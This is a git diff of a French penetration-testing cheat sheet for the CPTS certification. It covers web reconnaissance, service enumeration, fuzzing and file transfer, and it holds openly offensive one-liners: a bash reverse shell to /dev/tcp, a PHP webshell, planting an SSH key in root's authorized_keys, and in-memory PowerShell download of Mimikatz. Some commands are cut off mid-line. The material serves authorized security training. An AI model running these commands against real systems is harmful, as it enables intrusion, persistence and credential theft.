@@ -9,6 +9,7 @@ image: /assets/images/CPTS-logo.png
 
 ## CPTS Cheat sheet
 
+
 ## Collecte d'Informations
 
 La reconnaissance web est la première étape de toute évaluation de sécurité ou test d'intrusion. C'est similaire à l'enquête initiale d'un détective, qui recueille méticuleusement des indices et des preuves sur une cible avant de formuler un plan d'action. Dans le domaine numérique, cela se traduit par l'accumulation d'informations sur un site web ou une application web pour identifier les vulnérabilités potentielles, les erreurs de configuration de sécurité et les actifs précieux.
@@ -33,9 +34,9 @@ WHOIS est un protocole de requête et de réponse utilisé pour récupérer des 
 
 Par exemple, si vous vouliez savoir qui possède le domaine `example.com`, vous pourriez exécuter la commande suivante dans votre terminal :
 
-```shell
+```bash
 whois example.com
-```shell
+```
 
 Cela retournerait une multitude d'informations, notamment le registraire, les dates d'enregistrement et d'expiration, les serveurs de noms et les informations de contact du propriétaire du domaine.
 
@@ -47,9 +48,9 @@ Le système de noms de domaine (DNS) fonctionne comme le GPS d'Internet, traduis
 
 La commande `dig` vous permet d'interroger directement les serveurs DNS, récupérant des informations spécifiques sur les noms de domaine. Par exemple, si vous voulez trouver l'adresse IP associée à `example.com`, vous pouvez exécuter la commande suivante :
 
-```shell
+```bash
 dig example.com A
-```shell
+```
 
 Cette commande demande à `dig` d'interroger le DNS pour l'enregistrement `A` (qui fait correspondre un nom d'hôte à une adresse IPv4) de `example.com`. La sortie inclura généralement l'adresse IP demandée, ainsi que des détails supplémentaires sur la requête et la réponse. En maîtrisant la commande `dig` et en comprenant les différents types d'enregistrements DNS, vous acquérez la capacité d'extraire des informations précieuses sur l'infrastructure et la présence en ligne d'une cible.
 
@@ -80,6 +81,7 @@ Le processus de découverte des sous-domaines est connu sous le nom d'énumérat
 
 L'`énumération active` peut être plus approfondie mais présente un risque de détection plus élevé. À l'inverse, l'`énumération passive` est plus discrète mais peut ne pas découvrir tous les sous-domaines. La combinaison des deux techniques peut augmenter considérablement la probabilité de découvrir une liste complète des sous-domaines associés à votre cible, élargissant votre compréhension de leur présence en ligne et des vulnérabilités potentielles.
 
+
 #### Force Brute des Sous-domaines
 
 La force brute des sous-domaines est une technique proactive utilisée dans la reconnaissance web pour découvrir des sous-domaines qui ne sont pas immédiatement apparents par des méthodes passives. Elle consiste à générer systématiquement de nombreux noms de sous-domaines potentiels et à les tester contre le serveur DNS de la cible pour voir s'ils existent. Cette approche peut révéler des sous-domaines cachés qui peuvent héberger des informations précieuses, des serveurs de développement ou des applications vulnérables.
@@ -90,9 +92,9 @@ Pour utiliser `dnsenum` pour la force brute des sous-domaines, vous lui fournire
 
 Par exemple, la commande suivante tenterait de forcer brutalement les sous-domaines de `example.com` en utilisant une liste de mots nommée `subdomains.txt` :
 
-```shell
+```bash
 dnsenum example.com -f subdomains.txt
-```shell
+```
 
 #### Transferts de Zone
 
@@ -102,9 +104,9 @@ Ce fichier de zone liste tous les sous-domaines du domaine, leurs adresses IP as
 
 Pour tenter un transfert de zone, vous pouvez utiliser la commande `dig` avec l'option `axfr` (transfert de zone complet). Par exemple, pour demander un transfert de zone depuis le serveur DNS `ns1.example.com` pour le domaine `example.com`, vous exécuteriez :
 
-```shell
+```bash
 dig @ns1.example.com example.com axfr
-```shell
+```
 
 Cependant, les transferts de zone ne sont pas toujours autorisés. De nombreux serveurs DNS sont configurés pour restreindre les transferts de zone aux serveurs secondaires autorisés uniquement. Les serveurs mal configurés, cependant, peuvent permettre des transferts de zone depuis n'importe quelle source, exposant involontairement des informations sensibles.
 
@@ -118,9 +120,9 @@ Gobuster est un outil polyvalent qui peut être utilisé pour divers types de fo
 
 Pour utiliser Gobuster pour forcer brutalement les hôtes virtuels, vous aurez besoin d'une liste de mots contenant des noms d'hôte potentiels. Voici un exemple de commande :
 
-```shell
+```bash
 gobuster vhost -u http://192.0.2.1 -w hostnames.txt
-```shell
+```
 
 Dans cet exemple, `-u` spécifie l'adresse IP cible, et `-w` spécifie le fichier de liste de mots. Gobuster essaiera ensuite systématiquement chaque nom d'hôte dans la liste de mots et signalera ceux qui donnent une réponse valide du serveur web.
 
@@ -130,9 +132,9 @@ Les journaux de Transparence des Certificats (CT) offrent une mine d'information
 
 Le site web `crt.sh` fournit une interface de recherche pour les journaux CT. Pour extraire efficacement les sous-domaines en utilisant `crt.sh` dans votre terminal, vous pouvez utiliser une commande comme celle-ci :
 
-```shell
+```bash
 curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
-```shell
+```
 
 Cette commande récupère les données au format JSON de `crt.sh` pour `example.com` (le `%` est un caractère générique), extrait les noms de domaine en utilisant `jq`, supprime tous les préfixes génériques (`*.`) avec `sed`, et trie et déduplique finalement les résultats.
 
@@ -159,12 +161,15 @@ class ExampleSpider(scrapy.Spider):
                 yield {"file": link}
             elif not link.startswith("#") and not link.startswith("mailto:"):
                 yield response.follow(link, callback=self.parse)
-```shell
-Après avoir exécuté l'araignée Scrapy, vous aurez un fichier contenant les données extraites (par exemple, example_data.json). Vous pouvez analyser ces résultats en utilisant des outils en ligne de commande standard. Par exemple, pour extraire tous les liens :
+```
+
+Après avoir exécuté l'araignée Scrapy, vous aurez un fichier contenant les données extraites (par exemple, `example_data.json`). Vous pouvez analyser ces résultats en utilisant des outils en ligne de commande standard. Par exemple, pour extraire tous les liens :
+
 ```bash
 jq -r '.[] | select(.file != null) | .file' example_data.json | sort -u
-```shell
-Cette commande utilise jq pour extraire les liens, awk pour isoler les extensions de fichiers, sort pour les ordonner, et uniq -c pour compter leurs occurrences. En examinant attentivement les données extraites, vous pouvez identifier des motifs, des anomalies ou des fichiers sensibles qui pourraient être intéressants pour une enquête plus approfondie.
+```
+
+Cette commande utilise `jq` pour extraire les liens, `awk` pour isoler les extensions de fichiers, `sort` pour les ordonner, et `uniq -c` pour compter leurs occurrences. En examinant attentivement les données extraites, vous pouvez identifier des motifs, des anomalies ou des fichiers sensibles qui pourraient être intéressants pour une enquête plus approfondie.
 
 ### Découverte par Moteurs de Recherche
 
@@ -174,14 +179,14 @@ En utilisant des opérateurs de recherche avancés et des requêtes spécialisé
 
 | Opérateur | Description | Exemple |
 |-----------|-------------|---------|
-| site: | Restreint les résultats de recherche à un site web spécifique | site:example.com "réinitialisation de mot de passe" |
-| inurl: | Recherche un terme spécifique dans l'URL d'une page | inurl:admin login |
-| filetype: | Limite les résultats aux fichiers d'un type spécifique | filetype:pdf "rapport confidentiel" |
-| intitle: | Recherche un terme dans le titre d'une page | intitle:"index of" /backup |
-| cache: | Affiche la version en cache d'une page web | cache:example.com |
-| "terme de recherche" | Recherche l'expression exacte entre guillemets | "erreur interne" site:example.com |
-| OR | Combine plusieurs termes de recherche | inurl:admin OR inurl:login |
-| - | Exclut des termes spécifiques des résultats de recherche | inurl:admin -intext:wordpress |
+| `site:` | Restreint les résultats de recherche à un site web spécifique | `site:example.com "réinitialisation de mot de passe"` |
+| `inurl:` | Recherche un terme spécifique dans l'URL d'une page | `inurl:admin login` |
+| `filetype:` | Limite les résultats aux fichiers d'un type spécifique | `filetype:pdf "rapport confidentiel"` |
+| `intitle:` | Recherche un terme dans le titre d'une page | `intitle:"index of" /backup` |
+| `cache:` | Affiche la version en cache d'une page web | `cache:example.com` |
+| `"terme de recherche"` | Recherche l'expression exacte entre guillemets | `"erreur interne" site:example.com` |
+| `OR` | Combine plusieurs termes de recherche | `inurl:admin OR inurl:login` |
+| `-` | Exclut des termes spécifiques des résultats de recherche | `inurl:admin -intext:wordpress` |
 
 En combinant créativement ces opérateurs et en élaborant des requêtes ciblées, vous pouvez découvrir des documents sensibles, des répertoires exposés, des pages de connexion et d'autres informations précieuses qui peuvent aider dans vos efforts de reconnaissance.
 
@@ -193,581 +198,844 @@ La Wayback Machine, un projet de l'Internet Archive, archive le web depuis plus 
 
 | Fonctionnalité | Description | Cas d'Utilisation en Reconnaissance |
 |----------------|-------------|-------------------------------------|
-| Instantanés Historiques | Visualiser les versions passées des sites web, y compris les pages, le contenu et les changements de design | Identifier le contenu ou les fonctionnalités passées du site web qui ne sont plus disponibles |
-| Répertoires Cachés | Explorer les répertoires et fichiers qui ont pu être supprimés ou cachés de la version actuelle du site web | Découvrir des informations sensibles ou des sauvegardes qui ont été involontairement laissées accessibles dans les versions précédentes |
-| Changements de Contenu | Suivre les changements dans le contenu du site web, y compris le texte, les images et les liens | Identifier les modèles dans les mises à jour de contenu et évaluer l'évolution de la posture de sécurité d'un site web |
+| `Instantanés Historiques` | Visualiser les versions passées des sites web, y compris les pages, le contenu et les changements de design | Identifier le contenu ou les fonctionnalités passées du site web qui ne sont plus disponibles |
+| `Répertoires Cachés` | Explorer les répertoires et fichiers qui ont pu être supprimés ou cachés de la version actuelle du site web | Découvrir des informations sensibles ou des sauvegardes qui ont été involontairement laissées accessibles dans les versions précédentes |
+| `Changements de Contenu` | Suivre les changements dans le contenu du site web, y compris le texte, les images et les liens | Identifier les modèles dans les mises à jour de contenu et évaluer l'évolution de la posture de sécurité d'un site web |
 
 En exploitant la Wayback Machine, vous pouvez obtenir une perspective historique sur la présence en ligne de votre cible, révélant potentiellement des vulnérabilités qui ont pu être négligées dans la version actuelle du site web.
 
+
 ### Outils de Base
+
 ```bash
 **Général**
-```shell
+```
+
 ### Se connecter au VPN
+
 ```bash
 `sudo openvpn user.ovpn`
-```shell
+```
+
 ### Afficher notre adresse IP
+
 ```bash
 `ifconfig` ou `ip a`
-```shell
+```
+
 ### Afficher les réseaux accessibles via le VPN
+
 ```bash
 `netstat -rn`
-```shell
+```
+
 ### Se connecter en SSH à un serveur distant
+
 ```bash
 `ssh user@10.10.10.10`
-```shell
+```
+
 ### Se connecter en FTP à un serveur distant
+
 ```bash
 `ftp 10.129.42.253`
-```shell
+```
 
 ```bash
 **tmux**
-```shell
+```
+
 ### Démarrer tmux
+
 ```bash
 `tmux`
-```shell
+```
+
 ### tmux: préfixe par défaut
+
 ```bash
 `Ctrl+b`
-```shell
+```
+
 ### tmux: nouvelle fenêtre
+
 ```bash
 `prefix c`
-```shell
-### tmux: basculer vers la fenêtre (1)
+```
+
+### tmux: basculer vers la fenêtre (`1`)
+
 ```bash
 `prefix 1`
-```shell
+```
+
 ### tmux: diviser le panneau verticalement
+
 ```bash
 `prefix shift+%`
-```shell
+```
+
 ### tmux: diviser le panneau horizontalement
+
 ```bash
 `prefix shift+"`
-```shell
+```
+
 ### tmux: basculer vers le panneau de droite
+
 ```bash
 `prefix ->`
-```shell
+```
 
 ```bash
 **Vim**
-```shell
-### vim: ouvrir file avec vim
+```
+
+### vim: ouvrir `file` avec vim
+
 ```bash
 `vim file`
-```shell
-### vim: entrer en mode insert
+```
+
+### vim: entrer en mode `insert`
+
 ```bash
 `Esc+i`
-```shell
-### vim: revenir en mode normal
+```
+
+### vim: revenir en mode `normal`
+
 ```bash
 `Esc`
-```shell
+```
+
 ### vim: Couper un caractère
+
 ```bash
 `x`
-```shell
+```
+
 ### vim: Couper un mot
+
 ```bash
 `dw`
-```shell
+```
+
 ### vim: Couper une ligne entière
+
 ```bash
 `dd`
-```shell
+```
+
 ### vim: Copier un mot
+
 ```bash
 `yw`
-```shell
+```
+
 ### vim: Copier une ligne entière
+
 ```bash
 `yy`
-```shell
+```
+
 ### vim: Coller
+
 ```bash
 `p`
-```shell
+```
+
 ### vim: Aller à la ligne numéro 1
+
 ```bash
 `:1`
-```shell
+```
+
 ### vim: Écrire le fichier (sauvegarder)
+
 ```bash
 `:w`
-```shell
+```
+
 ### vim: Quitter
+
 ```bash
 `:q`
-```shell
+```
+
 ### vim: Quitter sans sauvegarder
+
 ```bash
 `:q!`
-```shell
+```
+
 ### vim: Écrire et quitter
+
 ```bash
 `:wq`
-```shell
+```
+
 ### Pentesting
+
 ```bash
 **Analyse de Services**
-```shell
+```
+
 ### Exécuter nmap sur une IP
+
 ```bash
 `nmap 10.129.42.253`
-```shell
+```
+
 ### Exécuter un scan de scripts nmap sur une IP
+
 ```bash
 `nmap -sV -sC -p- 10.129.42.253`
-```shell
+```
+
 ### Lister les différents scripts nmap disponibles
+
 ```bash
 `locate scripts/citrix`
-```shell
+```
+
 ### Exécuter un script nmap sur une IP
+
 ```bash
 `nmap --script smb-os-discovery.nse -p445 10.10.10.40`
-```shell
+```
+
 ### Récupérer la bannière d'un port ouvert
+
 ```bash
 `netcat 10.10.10.10 22`
-```shell
+```
+
 ### Lister les partages SMB
+
 ```bash
 `smbclient -N -L \\\\10.129.42.253`
-```shell
+```
+
 ### Se connecter à un partage SMB
+
 ```bash
 `smbclient \\\\10.129.42.253\\users`
-```shell
+```
+
 ### Scanner SNMP sur une IP
+
 ```bash
 `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0`
-```shell
+```
+
 ### Force brute de la chaîne secrète SNMP
+
 ```bash
 `onesixtyone -c dict.txt 10.129.42.254`
-```shell
+```
 
 ```bash
 **Énumération Web**
-```shell
+```
+
 ### Exécuter un scan de répertoires sur un site web
+
 ```bash
 `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt`
-```shell
+```
+
 ### Exécuter un scan de sous-domaines sur un site web
+
 ```bash
 `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt`
-```shell
+```
+
 ### Récupérer la bannière du site web
+
 ```bash
 `curl -IL https://www.inlanefreight.com`
-```shell
+```
+
 ### Lister les détails sur le serveur web/certificats
+
 ```bash
 `whatweb 10.10.10.121`
-```shell
-### Lister les répertoires potentiels dans robots.txt
+```
+
+### Lister les répertoires potentiels dans `robots.txt`
+
 ```bash
 `curl 10.10.10.121/robots.txt`
-```shell
+```
+
 ### Voir le code source de la page (dans Firefox)
+
 ```bash
 `Ctrl+U`
-```shell
+```
 
 ```bash
 **Exploits Publics**
-```shell
+```
+
 ### Rechercher des exploits publics pour une application web
+
 ```bash
 `searchsploit openssh 7.2`
-```shell
+```
+
 ### MSF: Démarrer le Metasploit Framework
+
 ```bash
 `msfconsole`
-```shell
+```
+
 ### MSF: Rechercher des exploits publics dans MSF
+
 ```bash
 `search exploit eternalblue`
-```shell
+```
+
 ### MSF: Commencer à utiliser un module MSF
+
 ```bash
 `use exploit/windows/smb/ms17_010_psexec`
-```shell
+```
+
 ### MSF: Afficher les options requises pour un module MSF
+
 ```bash
 `show options`
-```shell
+```
+
 ### MSF: Définir une valeur pour une option de module MSF
+
 ```bash
 `set RHOSTS 10.10.10.40`
-```shell
+```
+
 ### MSF: Tester si le serveur cible est vulnérable
+
 ```bash
 `check`
-```shell
+```
+
 ### MSF: Exécuter l'exploit sur le serveur cible
+
 ```bash
 `exploit`
-```shell
+```
 
 ```bash
 **Utilisation des Shells**
-```shell
-### Démarrer un écouteur nc sur un port local
+```
+
+### Démarrer un écouteur `nc` sur un port local
+
 ```bash
 `nc -lvnp 1234`
-```shell
+```
+
 ### Envoyer un shell inverse depuis le serveur distant
+
 ```bash
 `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`
-```shell
+```
+
 ### /bin/sh -i 2>&1\
+
 ```bash
 `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\
-```shell
+```
+
 ### /bin/bash -i 2>&1\
+
 ```bash
 `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\
-```shell
+```
+
 ### Se connecter à un shell lié démarré sur le serveur distant
+
 ```bash
 `nc 10.10.10.1 1234`
-```shell
+```
+
 ### Améliorer le shell TTY (1)
+
 ```bash
 `python -c 'import pty; pty.spawn("/bin/bash")'`
-```shell
+```
+
 ### Améliorer le shell TTY (2)
+
 ```bash
 `Ctrl+Z` puis `stty raw -echo` puis `fg` puis `Entrée` deux fois
-```shell
+```
+
 ### Créer un fichier webshell php
+
 ```bash
 `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`
-```shell
+```
+
 ### Exécuter une commande sur un webshell uploadé
+
 ```bash
 `curl http://SERVER_IP:PORT/shell.php?cmd=id`
-```shell
+```
 
 ```bash
 **Élévation de Privilèges**
-```shell
-### Exécuter le script linpeas pour énumérer le serveur distant
+```
+
+### Exécuter le script `linpeas` pour énumérer le serveur distant
+
 ```bash
 `./linpeas.sh`
-```shell
-### Lister les privilèges sudo disponibles
+```
+
+### Lister les privilèges `sudo` disponibles
+
 ```bash
 `sudo -l`
-```shell
-### Exécuter une commande avec sudo
+```
+
+### Exécuter une commande avec `sudo`
+
 ```bash
 `sudo -u user /bin/echo Hello World!`
-```shell
-### Passer à l'utilisateur root (si nous avons accès à sudo su)
+```
+
+### Passer à l'utilisateur root (si nous avons accès à `sudo su`)
+
 ```bash
 `sudo su -`
-```shell
-### Passer à un utilisateur (si nous avons accès à sudo su)
+```
+
+### Passer à un utilisateur (si nous avons accès à `sudo su`)
+
 ```bash
 `sudo su user -`
-```shell
+```
+
 ### Créer une nouvelle clé SSH
+
 ```bash
 `ssh-keygen -f key`
-```shell
+```
+
 ### Ajouter la clé publique générée à l'utilisateur
+
 ```bash
 `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`
-```shell
+```
+
 ### Se connecter en SSH au serveur avec la clé privée générée
+
 ```bash
 `ssh root@10.10.10.10 -i key`
-```shell
+```
 
 ```bash
 **Transfert de Fichiers**
-```shell
+```
+
 ### Démarrer un serveur web local
+
 ```bash
 `python3 -m http.server 8000`
-```shell
+```
+
 ### Télécharger un fichier sur le serveur distant depuis notre machine locale
+
 ```bash
 `wget http://10.10.14.1:8000/linpeas.sh`
-```shell
+```
+
 ### Télécharger un fichier sur le serveur distant depuis notre machine locale
+
 ```bash
 `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`
-```shell
-### Transférer un fichier au serveur distant avec scp (nécessite un accès SSH)
+```
+
+### Transférer un fichier au serveur distant avec `scp` (nécessite un accès SSH)
+
 ```bash
 `scp linenum.sh user@remotehost:/tmp/linenum.sh`
-```shell
-### Convertir un fichier en base64
+```
+
+### Convertir un fichier en `base64`
+
 ```bash
 `base64 shell -w 0`
-```shell
-### base64 -d > shell
+```
+
+### base64 -d > shell`
+
 ```bash
 `echo f0VMR...SNIO...InmDwU \
-```shell
-### Vérifier le md5sum du fichier pour s'assurer qu'il a été converti correctement
+```
+
+### Vérifier le `md5sum` du fichier pour s'assurer qu'il a été converti correctement
+
 ```bash
 `md5sum shell`
-```shell
+```
+
+
 ## Techniques de Transfert de Fichiers
 
 ### Télécharger un fichier avec PowerShell
+
 ```bash
 `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`
-```shell
+```
+
 ### Exécuter un fichier en mémoire avec PowerShell
+
 ```bash
 `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`
-```shell
+```
+
 ### Téléverser un fichier avec PowerShell
+
 ```bash
 `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`
-```shell
+```
+
 ### Télécharger un fichier avec Bitsadmin
+
 ```bash
 `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`
-```shell
+```
+
 ### Télécharger un fichier avec Certutil
+
 ```bash
 `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`
-```shell
+```
+
 ### Télécharger un fichier avec Wget
+
 ```bash
 `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`
-```shell
+```
+
 ### Télécharger un fichier avec cURL
+
 ```bash
 `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
-```shell
+```
+
 ### Télécharger un fichier avec PHP
+
 ```bash
 `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`
-```shell
+```
+
 ### Téléverser un fichier avec SCP
+
 ```bash
 `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`
-```shell
+```
+
 ### Télécharger un fichier avec SCP
+
 ```bash
 `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`
-```shell
+```
+
 ### Invoke-WebRequest avec un User Agent Chrome
+
 ```bash
 `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"`
-```shell
+```
+
 ## Fuzzing avec Ffuf
 
 ### Aide de ffuf
+
 ```bash
 `ffuf -h`
-```shell
+```
+
 ### Fuzzing de répertoires
+
 ```bash
 `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ`
-```shell
+```
+
 ### Fuzzing d'extensions
+
 ```bash
 `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ`
-```shell
+```
+
 ### Fuzzing de pages
+
 ```bash
 `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php`
-```shell
+```
+
 ### Fuzzing récursif
+
 ```bash
 `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v`
-```shell
+```
+
 ### Fuzzing de sous-domaines
+
 ```bash
 `ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/`
-```shell
+```
+
 ### Fuzzing d'hôtes virtuels
+
 ```bash
 `ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx`
-```shell
+```
+
 ### Fuzzing de paramètres - GET
+
 ```bash
 `ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx`
-```shell
+```
+
 ### Fuzzing de paramètres - POST
+
 ```bash
 `ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`
-```shell
+```
+
 ### Fuzzing de valeurs
+
 ```bash
 `ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`
-```shell
+```
+
 ### Wordlists
 
 ### Directory/Page Wordlist
+
 ```bash
 `/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt`
-```shell
+```
+
 ### Extensions Wordlist
+
 ```bash
 `/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt`
-```shell
+```
+
 ### Domain Wordlist
+
 ```bash
 `/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`
-```shell
+```
+
 ### Parameters Wordlist
+
 ```bash
 `/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt`
-```shell
+```
+
 ### Divers
 
 ### Ajouter une entrée DNS
+
 ```bash
 `sudo sh -c 'echo "SERVER_IP academy.htb" >> /etc/hosts'`
-```shell
+```
+
 ### Créer une liste de mots séquentielle
+
 ```bash
 `for i in $(seq 1 1000); do echo $i >> ids.txt; done`
-```shell
+```
+
 ### curl avec POST
+
 ```bash
 `curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'`
-```shell
+```
+
+
+
 ## Énumération basée sur l'Infrastructure
 
-### jq .
+### jq .`
+
 ```bash
 `curl -s https://crt.sh/\?q\=<target-domain>\&output\=json \
-```shell
+```
+
 ### Scanner chaque adresse IP d'une liste avec Shodan
+
 ```bash
 `for i in $(cat ip-addresses.txt);do shodan host $i;done`
-```shell
+```
+
 ### Énumération basée sur l'Hôte
 
 ##### FTP
 
 ### Interagir avec le service FTP sur la cible
+
 ```bash
 `ftp <FQDN/IP>`
-```shell
+```
+
 ### Interagir avec le service FTP sur la cible
+
 ```bash
 `nc -nv <FQDN/IP> 21`
-```shell
+```
+
 ### Interagir avec le service FTP sur la cible
+
 ```bash
 `telnet <FQDN/IP> 21`
-```shell
+```
+
 ### Interagir avec le service FTP sur la cible en utilisant une connexion chiffrée
+
 ```bash
 `openssl s_client -connect <FQDN/IP>:21 -starttls ftp`
-```shell
+```
+
 ### Télécharger tous les fichiers disponibles sur le serveur FTP cible
+
 ```bash
 `wget -m --no-passive ftp://anonymous:anonymous@<target>`
-```shell
+```
+
 ##### SMB
 
 ### Authentification par session nulle sur SMB
+
 ```bash
 `smbclient -N -L //<FQDN/IP>`
-```shell
+```
+
 ### Se connecter à un partage SMB spécifique
+
 ```bash
 `smbclient //<FQDN/IP>/<share>`
-```shell
+```
+
 ### Interaction avec la cible en utilisant RPC
+
 ```bash
 `rpcclient -U "" <FQDN/IP>`
-```shell
+```
+
 ### Énumération des noms d'utilisateur avec les scripts Impacket
+
 ```bash
 `samrdump.py <FQDN/IP>`
-```shell
+```
+
 ### Énumération des partages SMB
+
 ```bash
 `smbmap -H <FQDN/IP>`
-```shell
+```
+
 ### Énumération des partages SMB en utilisant une authentification par session nulle
+
 ```bash
 `crackmapexec smb <FQDN/IP> --shares -u '' -p ''`
-```shell
+```
+
 ### Énumération SMB avec enum4linux
+
 ```bash
 `enum4linux-ng.py <FQDN/IP> -A`
-```shell
+```
+
 ##### NFS
 
 ### Afficher les partages NFS disponibles
+
 ```bash
 `showmount -e <FQDN/IP>`
-```shell
+```
+
 ### Monter le partage NFS spécifique
+
 ```bash
 `mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock`
-```shell
+```
+
 ### Démonter le partage NFS spécifique
+
 ```bash
 `umount ./target-NFS`
-```shell
+```
+
 ##### DNS
 
 ### Requête NS vers le serveur de noms spécifique
+
 ```bash
 `dig ns <domain.tld> @<nameserver>`
-```shell
+```
+
 ### Requête ANY vers le serveur de noms spécifique
+
 ```bash
 `dig any <domain.tld> @<nameserver>`
-```shell
+```
+
 ### Requête AXFR vers le serveur de noms spécifique
+
 ```bash
 `dig axfr <domain.tld> @<nameserver>`
-```shell
+```
+
 ### Force brute des sous-domaines
+
 ```bash
 `dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>`
-```shell
+```
+
 ##### SMTP
 
 ### Se connecter au service SMTP
+
 ```bash
 `telnet <FQDN/IP> 25`
-```shell
+```
+
 ### Énumérer le service SMTP
+
 ```bash
 `sudo nmap $ip -sC -sV -p25`
-```shell
-### nc -nv -w 6 $ip 25  ; done
+```
+
+### nc -nv -w 6 $ip 25  ; done`
+
 ```bash
 `for user in $(cat users.txt); do echo VRFY $user \
-```shell
+```
+
 ##### IMAP/POP3
 
 ### Se connecter au service IMAPS
+
 ```bash
 `openssl s_client -connect <FQDN/IP>:imaps`
-```shell
+```
+
 ### Se connecter au service POP3S
+
 ```bash
 `openssl s_client -connect <FQDN/IP>:pop3s`
-```shell
+```
+
 Une fois la connexion établie, voici les commandes IMAP et POP3 :
+
 ```bash
 ############
 Commandes IMAP
@@ -806,7 +1074,7 @@ a CLOSE
 
 # Ferme la connexion avec le serveur IMAP
 a LOGOUT
-```shell
+```
 
 ```bash
 ############
@@ -839,78 +1107,107 @@ RSET
 
 # Ferme la connexion avec le serveur POP3
 QUIT
-```shell
+```
+
+
 **Command**                                               | **Description**                                                                                    |
 | --------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
-| sudo nmap $ip -sV -p110,143,993,995 -sC                  | Footprinting the service                                                                           |
-| curl -v -k 'imaps://<FQDN/IP>' --user <user>:<password> | Log in to the IMAPS service using cURL. -v is the verbose option to see how the connection is made |
+| sudo nmap $ip -sV -p110,143,993,995 -sC`                  | Footprinting the service                                                                           |
+| `curl -v -k 'imaps://<FQDN/IP>' --user <user>:<password>` | Log in to the IMAPS service using cURL. -v is the verbose option to see how the connection is made |
 
 After connection is established, see the IMAP and POP3 commands:
 
 ##### SNMP
 
 ### Interroger les OIDs avec snmpwalk
+
 ```bash
 `snmpwalk -v2c -c <community string> <FQDN/IP>`
-```shell
+```
+
 ### Force brute des chaînes de communauté du service SNMP
+
 ```bash
 `onesixtyone -c community-strings.list <FQDN/IP>`
-```shell
+```
+
 ### Force brute des OIDs du service SNMP
+
 ```bash
 `braa <community string>@<FQDN/IP>:.1.*`
-```shell
+```
+
 #### SQL
 
 ### Analyse du service
+
 ```bash
 `sudo nmap $ip -sV -sC -p3306 --script mysql*`
-```shell
+```
+
 ### Exécuter le script pour vérifier les mots de passe vides
+
 ```bash
 `sudo nmap -sS -sV --script mysql-empty-password -p 3306 $ip`
-```shell
+```
+
 ##### MySQL
 
 ### Se connecter au serveur MySQL. Il ne doit **pas** y avoir d'espace entre le drapeau '-p' et le mot de passe
+
 ```bash
 `mysql -u <user> -p<password> -h <IP address>`
-```shell
+```
+
 ### Afficher toutes les bases de données
+
 ```bash
 `show databases;`
-```shell
+```
+
 ### Sélectionner une des bases de données existantes
+
 ```bash
 `use <database>;`
-```shell
+```
+
 ### Afficher toutes les tables disponibles dans la base de données sélectionnée
+
 ```bash
 `show tables;`
-```shell
+```
+
 ### Afficher toutes les colonnes dans la base de données sélectionnée
+
 ```bash
 `show columns from <table>;`
-```shell
+```
+
 ### Afficher tout le contenu de la table souhaitée
+
 ```bash
 `select * from <table>;`
-```shell
-### Rechercher une chaîne spécifique dans la table souhaitée
+```
+
+### Rechercher une `chaîne` spécifique dans la table souhaitée
+
 ```bash
 `select * from <table> where <column> = "<string>";`
-```shell
+```
+
 ##### MSSQL
 
 ### Énumération
+
 ```bash
 `nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip`
-```shell
+```
+
